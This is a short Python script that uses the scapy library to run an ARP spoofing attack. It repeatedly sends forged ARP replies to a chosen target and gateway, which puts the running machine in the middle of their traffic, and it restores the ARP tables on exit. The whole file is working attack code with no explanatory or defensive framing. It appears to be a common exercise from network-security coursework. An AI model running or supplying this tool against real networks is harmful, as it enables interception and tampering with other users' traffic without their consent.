import scapy.all as scapy
import argparse
import time
import sys

def GetArguments():
    Parser = argparse.ArgumentParser()
    Parser.add_argument("-t", "--target", dest = "target", help = "Specify Target IP")
    Parser.add_argument("-g", "--gateway", dest = "gateway", help = "Specify Spoof IP")
    return Parser.parse_args()

def GetMAC(IP):
    ARPPacket = scapy.ARP(pdst = IP)
    BroadcastPacket = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    ARPBroadcastPacket = BroadcastPacket / ARPPacket
    AnsweredList = scapy.srp(ARPBroadcastPacket, timeout = 1, verbose = False)[0]

    if AnsweredList:
        return AnsweredList[0][1].hwsrc
    else:
        print(f"No response for {IP}. Check if the IP is correct and reachable.")
        sys.exit(1)

def Restore(DestinationIP, SourceIP):
    DestinationMAC = GetMAC(DestinationIP)
    SourceMAC = GetMAC(SourceIP)
    Packet = scapy.ARP(op = 2, pdst = DestinationIP, hwdst = DestinationMAC, psrc = SourceIP, hwsrc = SourceMAC)
    scapy.send(Packet, 4)

def Spoof(TargetIP, SpoofIP):
    TargetMAC = GetMAC(TargetIP)
    Packet = scapy.ARP(op = 2, pdst = TargetIP, hwdst = TargetMAC, psrc = SpoofIP)
    scapy.send(Packet, verbose = False)

Arguments = GetArguments()
SentPackets = 0

try:
    while True:
        Spoof(Arguments.target, Arguments.gateway)
        Spoof(Arguments.gateway, Arguments.target)
        SentPackets += 2
        print("\rSent packets : " + str(SentPackets))
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\nRestoring ARP Tables... Please Wait!")
    Restore(Arguments.target,Arguments.gateway)
    Restore(Arguments.gateway, Arguments.target)